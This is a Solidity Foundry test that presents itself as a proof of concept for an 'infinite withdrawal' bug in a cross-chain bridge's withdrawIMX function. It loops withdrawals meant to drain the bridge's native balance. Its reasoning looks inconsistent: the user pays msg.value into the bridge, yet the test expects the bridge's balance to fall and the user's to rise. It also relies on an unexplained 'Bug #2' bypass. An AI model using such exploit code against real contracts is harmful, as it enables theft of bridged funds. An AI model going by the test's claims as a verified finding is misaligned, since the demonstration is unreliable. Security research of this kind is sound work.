// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol"; 
import "../src/child/ChildERC20Bridge.sol";
import "../src/child/WIMX.sol";
import "../src/child/ChildAxelarBridgeAdaptor.sol";
import "../src/interfaces/child/IChildERC20.sol";
import "../src/interfaces/child/IChildBridgeAdaptor.sol";
import "../src/interfaces/child/IChildERC20Bridge.sol";
import "../src/interfaces/child/IChildAxelarBridgeAdaptor.sol";
import "../test/mocks/child/MockChildToken.sol";
import "../test/mocks/root/MockAxelarGateway.sol";

contract InfiniteWithdrawalTest is Test {
    ChildERC20Bridge bridge;
    WIMX wimxInstance;
    MockChildToken childTokenTemplateInstance;
    ChildAxelarBridgeAdaptor adaptor;
    MockAxelarGateway mockGateway;

    address public constant MOCK_GAS_SERVICE_ADDRESS = address(0x1337BEEF); 

    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address rootTokenIMX = makeAddr("rootTokenIMX");

    address constant NATIVE_IMX = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;

    bytes32 public constant BRIDGE_MANAGER_ROLE = keccak256("BRIDGE_MANAGER");
    bytes32 public constant DEFAULT_ADMIN_ROLE = 0x0000000000000000000000000000000000000000000000000000000000000000;
    bytes32 public constant GAS_SERVICE_MANAGER_ROLE = keccak256("GAS_SERVICE_MANAGER");
    bytes32 public constant TARGET_MANAGER_ROLE = keccak256("TARGET_MANAGER");


    function setUp() public {
        vm.startPrank(deployer);
        mockGateway = new MockAxelarGateway();
        bytes4 selector = IAxelarGasService.payNativeGasForContractCall.selector;
        vm.mockCall(
            MOCK_GAS_SERVICE_ADDRESS,
            selector,
            abi.encode(true) 
        );

        vm.deal(MOCK_GAS_SERVICE_ADDRESS, 10 ether);

        wimxInstance = new WIMX();
        childTokenTemplateInstance = new MockChildToken();

        bridge = new ChildERC20Bridge(deployer);

        adaptor = new ChildAxelarBridgeAdaptor(address(mockGateway), deployer);

        IChildAxelarBridgeAdaptor.InitializationRoles memory adaptorRoles = IChildAxelarBridgeAdaptor.InitializationRoles({
            defaultAdmin: deployer,
            bridgeManager: deployer,
            gasServiceManager: deployer,
            targetManager: deployer
        });

        adaptor.initialize(
            adaptorRoles,
            address(bridge),
            "mock-root-chain",
            "mock-root-adaptor",
            MOCK_GAS_SERVICE_ADDRESS
        );

        IChildERC20Bridge.InitializationRoles memory bridgeRoles = IChildERC20Bridge.InitializationRoles({
            defaultAdmin: deployer,
            pauser: deployer,
            unpauser: deployer,
            adaptorManager: deployer,
            initialDepositor: deployer,
            treasuryManager: deployer
        });

        bridge.initialize(
            bridgeRoles,
            address(adaptor),
            address(childTokenTemplateInstance),
            rootTokenIMX,
            address(wimxInstance)
        );

        adaptor.updateChildBridge(address(bridge));

        vm.deal(address(bridge), 10 ether);
        console.log("Initial Bridge ETH balance (simulating IMX supply):", address(bridge).balance); 

        vm.stopPrank();
    }

    function testInfiniteIMXWithdrawal() public {
        uint256 amountToWithdraw = 1 ether;
        uint256 sufficientMsgValue = amountToWithdraw + 0.1 ether;

        vm.startPrank(user);
        vm.deal(user, sufficientMsgValue * 5);

        uint256 initialBridgeETH = address(bridge).balance;
        uint256 initialUserETH = user.balance;

        console.log("\n--- Demonstrating Bug #1: Over-withdrawal due to lack of balance check (assuming Bug #2 is bypassed) ---");
        console.log(string.concat("Initial Bridge ETH balance: ", vm.toString(initialBridgeETH)));
        console.log(string.concat("Initial User ETH balance: ", vm.toString(initialUserETH)));
        console.log(string.concat("Amount to withdraw per transaction (IMX): ", vm.toString(amountToWithdraw)));
        console.log(string.concat("msg.value sent for each withdrawal (to bypass underflow): ", vm.toString(sufficientMsgValue)));


        uint256 numWithdrawals = 3;
        for (uint256 i = 0; i < numWithdrawals; i++) {
            console.log(string.concat("Attempting withdrawal #", vm.toString(i + 1), "..."));

            bridge.withdrawIMX{value: sufficientMsgValue}(amountToWithdraw);

            console.log(string.concat("Bridge ETH balance after withdrawal #", vm.toString(i + 1), ": ", vm.toString(address(bridge).balance)));
            console.log(string.concat("User ETH balance after withdrawal #", vm.toString(i + 1), ": ", vm.toString(user.balance)));
        }

        uint256 totalEthWithdrawnByBridge = (amountToWithdraw + (sufficientMsgValue - amountToWithdraw)) * numWithdrawals;

        assertApproxEqAbs(address(bridge).balance, initialBridgeETH - totalEthWithdrawnByBridge, 1e16, "Bridge ETH balance did not decrease as expected (for total withdrawals)");
        assert(user.balance > initialUserETH);

        console.log("\n--- Infinite Withdrawal (Over-withdrawal) Bug #1 Demonstrated ---");
        console.log("A user could withdraw IMX multiple times, exceeding any conceptual 'deposited' amount (since no per-user balance is checked for NATIVE_IMX), until the bridge's ETH reserves are depleted.");
        console.log("This highlights the lack of individual user IMX balance tracking for NATIVE_IMX withdrawals.");
        vm.stopPrank();
    }
}